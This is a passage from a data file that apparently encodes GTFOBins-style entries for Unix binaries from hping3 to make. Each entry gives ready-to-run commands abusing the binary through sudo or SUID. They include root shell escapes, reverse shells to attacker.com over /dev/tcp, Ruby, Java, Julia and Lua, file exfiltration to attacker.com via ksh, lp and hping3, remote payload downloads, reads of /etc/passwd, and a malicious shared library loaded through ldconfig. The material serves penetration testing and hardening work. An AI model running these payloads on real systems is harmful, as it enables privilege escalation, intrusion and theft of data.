                        code: "./hping3\n/bin/sh -p\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo hping3\n/bin/sh\n",
                    },
                    {
                        description:
                            "The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:\n\n```\nsudo hping3 --icmp --listen xxx --dump\n```\n",
                        code: 'RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 "$RHOST" --icmp --data 500 --sign xxx --file "$LFILE"\n',
                    },
                ],
            },
        },
        iconv: {
            description:
                "The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.",
            functions: {
                "file-write": [
                    {
                        code: 'LFILE=file_to_write\necho "DATA" | iconv -f 8859_1 -t 8859_1 -o "$LFILE"\n',
                    },
                ],
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 "$LFILE"\n',
                    },
                ],
            },
        },
        iftop: {
            description:
                "This requires `iftop` 0.17 and the privilege to capture on some device (specify with `-i` if needed) .",
            functions: {
                shell: [
                    {
                        code: "iftop\n!/bin/sh\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./iftop\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo iftop\n!/bin/sh\n",
                    },
                ],
            },
        },
        install: {
            description:
                "This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a copy of the file.",
            functions: {
                suid: [
                    {
                        code: "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n",
                    },
                ],
            },
        },
        ionice: {
            functions: {
                shell: [
                    {
                        code: "ionice /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./ionice /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ionice /bin/sh",
                    },
                ],
            },
        },
        ip: {
            description: "The read file content is corrupted by error prints.\n",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nip -force -batch "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./ip -force -batch "$LFILE"\n',
                    },
                    {
                        description: "This only works for Linux with CONFIG_NET_NS=y.",
                        code: "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n",
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo ip -force -batch "$LFILE"\n',
                    },
                    {
                        description: "This only works for Linux with CONFIG_NET_NS=y.",
                        code: "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n",
                    },
                    {
                        description:
                            "This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.",
                        code: "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar\n",
                    },
                ],
            },
        },
        irb: {
            functions: {
                shell: [
                    {
                        code: "irb\nexec '/bin/bash'\n",
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'export RHOST=\'127.0.0.1\'\nexport RPORT=9000\nirb\nrequire \'socket\'; exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read} end\n',
                    },
                ],
                "file-upload": [
                    {
                        description: "Serve files in the local folder running an HTTP server on port 8888.",
                        code: "irb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;\n",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nirb\nrequire 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])\n",
                    },
                ],
                "file-write": [
                    {
                        code: 'irb\nFile.open("file_to_write", "w+") { |f| f.write("DATA") }\n',
                    },
                ],
                "file-read": [
                    {
                        code: 'irb\nputs File.read("file_to_read")\n',
                    },
                ],
                "library-load": [
                    {
                        code: 'irb\nrequire "fiddle"; Fiddle.dlopen("lib.so")\n',
                    },
                ],
                sudo: [
                    {
                        code: "sudo irb\nexec '/bin/bash'\n",
                    },
                ],
            },
        },
        ispell: {
            functions: {
                shell: [
                    {
                        code: "ispell /etc/passwd\n!/bin/sh\n",
                    },
                ],
                suid: [
                    {
                        code: "./ispell /etc/passwd\n!/bin/sh -p\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ispell /etc/passwd\n!/bin/sh\n",
                    },
                ],
            },
        },
        jjs: {
            description: "This tool is installed starting with Java SE 8.",
            functions: {
                shell: [
                    {
                        code: "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs",
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\necho \'var host=Java.type("java.lang.System").getenv("RHOST");\nvar port=Java.type("java.lang.System").getenv("RPORT");\nvar ProcessBuilder = Java.type("java.lang.ProcessBuilder");\nvar p=new ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();\nvar Socket = Java.type("java.net.Socket");\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();\' | jjs\n',
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\necho \"var URL = Java.type('java.net.URL');\nvar ws = new URL('$URL');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('$LFILE');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();\" | jjs\n",
                    },
                ],
                "file-write": [
                    {
                        code: 'echo \'var FileWriter = Java.type("java.io.FileWriter");\nvar fw=new FileWriter("./file_to_write");\nfw.write("DATA");\nfw.close();\' | jjs\n',
                    },
                ],
                "file-read": [
                    {
                        code: 'echo \'var BufferedReader = Java.type("java.io.BufferedReader");\nvar FileReader = Java.type("java.io.FileReader");\nvar br = new BufferedReader(new FileReader("file_to_read"));\nwhile ((line = br.readLine()) != null) { print(line); }\' | jjs\n',
                    },
                ],
                suid: [
                    {
                        description: "This has been found working in macOS but failing on Linux systems.",
                        code: "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs",
                    },
                ],
                sudo: [
                    {
                        code: "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs",
                    },
                ],
            },
        },
        joe: {
            functions: {
                shell: [
                    {
                        code: "joe\n^K!/bin/sh\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./joe\n^K!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo joe\n^K!/bin/sh\n",
                    },
                ],
            },
        },
        join: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\njoin -a 2 /dev/null $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./join -a 2 /dev/null $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n",
                    },
                ],
            },
        },
        journalctl: {
            description:
                "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.\n\nThis might not work if run by unprivileged users depending on the system configuration.\n",
            functions: {
                shell: [
                    {
                        code: "journalctl\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo journalctl\n!/bin/sh\n",
                    },
                ],
            },
        },
        jq: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\njq -Rr . "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./jq -Rr . "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo jq -Rr . "$LFILE"\n',
                    },
                ],
            },
        },
        jrunscript: {
            description: "This tool is installed starting with Java SE 6.",
            functions: {
                shell: [
                    {
                        code: "jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\"",
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\njrunscript -e \'var host=\'"\'""$RHOST""\'"\'; var port=\'"$RPORT"\';\nvar p=new java.lang.ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();\nvar s=new java.net.Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();\'\n',
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\njrunscript -e \"cp('$URL','$LFILE')\"\n",
                    },
                ],
                "file-write": [
                    {
                        code: 'jrunscript -e \'var fw=new java.io.FileWriter("./file_to_write"); fw.write("DATA"); fw.close();\'',
                    },
                ],
                "file-read": [
                    {
                        code: "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"file_to_read\")); while ((line = br.readLine()) != null) { print(line); }'",
                    },
                ],
                suid: [
                    {
                        description: "This has been found working in macOS but failing on Linux systems.",
                        code: "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\"",
                    },
                ],
                sudo: [
                    {
                        code: "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\"",
                    },
                ],
            },
        },
        jtag: {
            functions: {
                shell: [
                    {
                        code: "jtag --interactive\nshell /bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo jtag --interactive\nshell /bin/sh\n",
                    },
                ],
            },
        },
        julia: {
            functions: {
                shell: [
                    {
                        code: "julia -e 'run(`/bin/sh`)'\n",
                    },
                ],
                "file-read": [
                    {
                        code: "export LFILE=file_to_read\njulia -e 'print(open(f->read(f, String), ENV[\"LFILE\"]))'\n",
                    },
                ],
                "file-write": [
                    {
                        code: 'export LFILE=file_to_write\njulia -e \'open(f->write(f, "DATA"), ENV["LFILE"], "w")\'\n',
                    },
                ],
                "file-download": [
                    {
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\njulia -e \'download(ENV["URL"], ENV["LFILE"])\'\n',
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\njulia -e \'using Sockets; sock=connect(ENV["RHOST"], parse(Int64,ENV["RPORT"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;\'\n',
                    },
                ],
                suid: [
                    {
                        code: "./julia -e 'run(`/bin/sh -p`)'\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo julia -e 'run(`/bin/sh`)'\n",
                    },
                ],
            },
        },
        knife: {
            description: "This is capable of running [`ruby`](/gtfobins/ruby/) code.",
            functions: {
                shell: [
                    {
                        code: "knife exec -E 'exec \"/bin/sh\"'\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo knife exec -E 'exec \"/bin/sh\"'\n",
                    },
                ],
            },
        },
        ksh: {
            functions: {
                shell: [
                    {
                        code: "ksh",
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: "export RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'\n",
                    },
                ],
                "file-upload": [
                    {
                        description:
                            "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        code: "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'echo -e \"POST / HTTP/0.9\\n\\n$(cat $LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n",
                    },
                    {
                        description:
                            'Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.',
                        code: "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c \'{ echo -ne "GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ "$REPLY" = "$(echo -ne "\\r")" ] && break; done; cat; } > $LFILE\'\n',
                    },
                    {
                        description:
                            'Fetch remote file using a TCP connection. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file.',
                        code: "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n",
                    },
                ],
                "file-write": [
                    {
                        code: "export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'\n",
                    },
                ],
                "file-read": [
                    {
                        description: "It trims trailing newlines.",
                        code: "export LFILE=file_to_read\nksh -c 'echo \"$(<$LFILE)\"'\n",
                    },
                    {
                        description: "It trims trailing newlines.",
                        code: 'export LFILE=file_to_read\nksh -c $\'read -r -d \\x04 < "$LFILE"; echo "$REPLY"\'\n',
                    },
                ],
                suid: [
                    {
                        code: "./ksh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ksh",
                    },
                ],
            },
        },
        ksshell: {
            description:
                "Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nksshell -i $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./ksshell -i $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo ksshell -i $LFILE\n",
                    },
                ],
            },
        },
        ksu: {
            functions: {
                sudo: [
                    {
                        code: "sudo ksu -q -e /bin/sh",
                    },
                ],
            },
        },
        kubectl: {
            description: "It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`.",
            functions: {
                "file-upload": [
                    {
                        code: "LFILE=dir_to_serve\nkubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n",
                    },
                ],
            },
        },
        latex: {
            functions: {
                shell: [
                    {
                        code: "latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
                    },
                ],
                "file-read": [
                    {
                        description: "The read file will be part of the output.",
                        code: "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
                    },
                ],
                sudo: [
                    {
                        description: "The read file will be part of the output.",
                        code: "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
                    },
                    {
                        code: "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
                    },
                ],
            },
        },
        latexmk: {
            description: "This allows to execute [`perl`](/gtfobins/perl/) code.",
            functions: {
                shell: [
                    {
                        code: "latexmk -e 'exec \"/bin/sh\";'\n",
                    },
                    {
                        code: "latexmk -latex='/bin/sh #' /dev/null\n",
                    },
                ],
                "file-read": [
                    {
                        code: "latexmk -e 'open(X,\"/etc/passwd\");while(<X>){print $_;}exit'\n",
                    },
                    {
                        description: "The read file will be part of the output.",
                        code: "TF=$(mktemp)\necho '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}' >$TF\nstrings tmp.dvi\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo latexmk -e 'exec \"/bin/sh\";'",
                    },
                ],
            },
        },
        "ld.so": {
            description:
                "`ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:\n\n```\n$ strings /proc/self/exe | head -1\n/lib64/ld-linux-x86-64.so.2\n```\n\nIt's worth noting that the spawned process will be the loader, not the target executable, this might aid evasion. See https://shyft.us/posts/20230526_linux_command_proxy.html for more information.\n",
            functions: {
                shell: [
                    {
                        code: "/lib/ld.so /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./ld.so /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo /lib/ld.so /bin/sh",
                    },
                ],
            },
        },
        ldconfig: {
            description:
                'Follows a minimal example of how to use the described technique (details may change across different distributions).\n\nRun the code associated with the technique.\n\nIdentify a target SUID executable, for example the `libcap` library of `ping`:\n\n```\n$ ldd /bin/ping | grep libcap\n      libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)\n```\n\nCreate a fake library that spawns a shell at bootstrap:\n\n```\necho \'#include <unistd.h>\n\n__attribute__((constructor))\nstatic void init() {\n    execl("/bin/sh", "/bin/sh", "-p", NULL);\n}\n\' >"$TF/lib.c"\n```\n\nCompile it with:\n\n```\ngcc -fPIC -shared "$TF/lib.c" -o "$TF/libcap.so.2"\n```\n\nRun `ldconfig` again as described below then just run `ping` to obtain a root shell:\n\n```\n$ ping\n# id\nuid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)\n```\n',
            functions: {
                sudo: [
                    {
                        description:
                            "This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.",
                        code: 'TF=$(mktemp -d)\necho "$TF" > "$TF/conf"\n# move malicious libraries in $TF\nsudo ldconfig -f "$TF/conf"\n',
                    },
                ],
                "limited-suid": [
                    {
                        description:
                            "This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.",
                        code: 'TF=$(mktemp -d)\necho "$TF" > "$TF/conf"\n# move malicious libraries in $TF\n./ldconfig -f "$TF/conf"\n',
                    },
                ],
            },
        },
        less: {
            functions: {
                shell: [
                    {
                        code: "less /etc/profile\n!/bin/sh\n",
                    },
                    {
                        code: "VISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv\n",
                    },
                    {
                        code: "less /etc/profile\nv:shell\n",
                    },
                ],
                "file-read": [
                    {
                        code: "less file_to_read",
                    },
                    {
                        description:
                            "This is useful when `less` is used as a pager by another binary to read a different file.",
                        code: "less /etc/profile\n:e file_to_read\n",
                    },
                ],
                "file-write": [
                    {
                        code: "echo DATA | less\nsfile_to_write\nq\n",
                    },
                    {
                        description: "This invokes the default editor to edit the file. The file must exist.",
                        code: "less file_to_write\nv\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo less /etc/profile\n!/bin/sh\n",
                    },
                ],
                suid: [
                    {
                        code: "./less file_to_read",
                    },
                ],
            },
        },
        lftp: {
            functions: {
                shell: [
                    {
                        code: "lftp -c '!/bin/sh'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./lftp -c '!/bin/sh'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo lftp -c '!/bin/sh'",
                    },
                ],
            },
        },
        ln: {
            description:
                "This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.",
            functions: {
                sudo: [
                    {
                        code: "sudo ln -fs /bin/sh /bin/ln\nsudo ln\n",
                    },
                ],
            },
        },
        loginctl: {
            description:
                "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.\n\nThis might not work if run by unprivileged users depending on the system configuration.\n",
            functions: {
                shell: [
                    {
                        code: "loginctl user-status\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo loginctl user-status\n!/bin/sh\n",
                    },
                ],
            },
        },
        logsave: {
            functions: {
                shell: [
                    {
                        code: "logsave /dev/null /bin/sh -i",
                    },
                ],
                sudo: [
                    {
                        code: "sudo logsave /dev/null /bin/sh -i",
                    },
                ],
                suid: [
                    {
                        code: "./logsave /dev/null /bin/sh -i -p",
                    },
                ],
            },
        },
        look: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nlook '' \"$LFILE\"\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./look '' \"$LFILE\"\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n",
                    },
                ],
            },
        },
        lp: {
            functions: {
                "file-upload": [
                    {
                        description:
                            "To collect the file run the following on the attacker box (this requires `cups` to be installed):\n\n1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;\n2. `lpadmin -d printer` to set the new printer as default;\n3. `cupsctl --remote-any` to enable printing from the Internet;\n4. `nc -lkp 9100` to receive the file.\n\nSend a local file to a CUPS server.\n",
                        code: "LFILE=file_to_send\nRHOST=attacker.com\nlp $LFILE -h $RHOST\n",
                    },
                ],
            },
        },
        ltrace: {
            functions: {
                "file-read": [
                    {
                        description:
                            "The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.",
                        code: "LFILE=file_to_read\nltrace -F $LFILE /dev/null\n",
                    },
                ],
                "file-write": [
                    {
                        description:
                            "The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.",
                        code: "LFILE=file_to_write\nltrace -s 999 -o $LFILE ltrace -F DATA\n",
                    },
                ],
                shell: [
                    {
                        code: "ltrace -b -L /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ltrace -b -L /bin/sh",
                    },
                ],
            },
        },
        lua: {
            functions: {
                shell: [
                    {
                        code: "lua -e 'os.execute(\"/bin/sh\")'",
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description:
                            "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nlua -e \'local s=require("socket");\n  local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));t:send(b);\n  end;\n  f:close();t:close();\'\n',
                    },
                ],
                "non-interactive-bind-shell": [
                    {
                        description:
                            "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.",
                        code: 'export LPORT=12345\nlua -e \'local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,"r"));\n    local b=assert(f:read("*a"));c:send(b);\n  end;c:close();f:close();\'\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires `lua-socket` installed.',
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nlua -e \'\n  local f=io.open(os.getenv("LFILE"), \'rb\')\n  local d=f:read("*a")\n  io.close(f);\n  local s=require("socket");\n  local t=assert(s.tcp());\n  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));\n  t:send(d);\n  t:close();\'\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            'Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file. This requires `lua-socket` installed.',
                        code: 'export LPORT=12345\nexport LFILE=file_to_save\nlua -e \'local k=require("socket");\n  local s=assert(k.bind("*",os.getenv("LPORT")));\n  local c=s:accept();\n  local d,x=c:receive("*a");\n  c:close();\n  local f=io.open(os.getenv("LFILE"), "wb");\n  f:write(d);\n  io.close(f);\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: 'lua -e \'local f=io.open("file_to_write", "wb"); f:write("DATA"); io.close(f);\'',
                    },
                ],
                "file-read": [
                    {
                        code: 'lua -e \'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);\'',
                    },
                ],
                suid: [
                    {
                        code: 'lua -e \'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);\'',
                    },
                ],
                sudo: [
                    {
                        code: "sudo lua -e 'os.execute(\"/bin/sh\")'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./lua -e 'os.execute(\"/bin/sh\")'",
                    },
                ],
            },
        },
        lualatex: {
            description: "This allows to execute [`lua`](/gtfobins/lua/) code.",
            functions: {
                shell: [
                    {
                        code: "lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'",
                    },
                ],
            },
        },
        luatex: {
            description: "This allows to execute [`lua`](/gtfobins/lua/) code.",
            functions: {
                shell: [
                    {
                        code: "luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'",
                    },
                ],
            },
        },
        "lwp-download": {
            description: "Fetch a remote file via HTTP GET request.",
            functions: {
                "file-download": [
                    {
                        code: "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nlwp-download $URL $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n",
                    },
                ],
                "file-read": [
                    {
                        description: "The file path must be absolute.",
                        code: 'LFILE=file_to_read\nTF=$(mktemp)\nlwp-download "file://$LFILE" $TF\ncat $TF\n',
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file://$TF $LFILE\n",
                    },
                ],
            },
        },
        "lwp-request": {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nlwp-request "file://$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo lwp-request "file://$LFILE"\n',
                    },
                ],
            },
        },
        mail: {
            functions: {
                shell: [
                    {
                        description: "GNU version only.",
                        code: "mail --exec='!/bin/sh'",
                    },
                    {
                        description: "This creates a valid Mbox file which may be required by the binary.",
                        code: 'TF=$(mktemp)\necho "From nobody@localhost $(date)" > $TF\nmail -f $TF\n!/bin/sh\n',
                    },
                ],
                sudo: [
                    {
                        description: "GNU version only.",
                        code: "sudo mail --exec='!/bin/sh'",
                    },
                ],
            },
        },
        make: {
            description:
                "All these examples only work with GNU `make` due to the lack of support of the `--eval` flag. The same can be achieved by using a proper `Makefile` or by passing the content via stdin using `-f -`.",
            functions: {
                shell: [
                    {
                        code: "COMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n",
                    },
                ],
                "file-write": [
                    {
                        description: "Requires a newer GNU `make` version.",
                        code: 'LFILE=file_to_write\nmake -s --eval="\\$(file >$LFILE,DATA)" .\n',
                    },
                ],
                suid: [
                    {
                        code: "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n",
                    },
                ],
                sudo: [
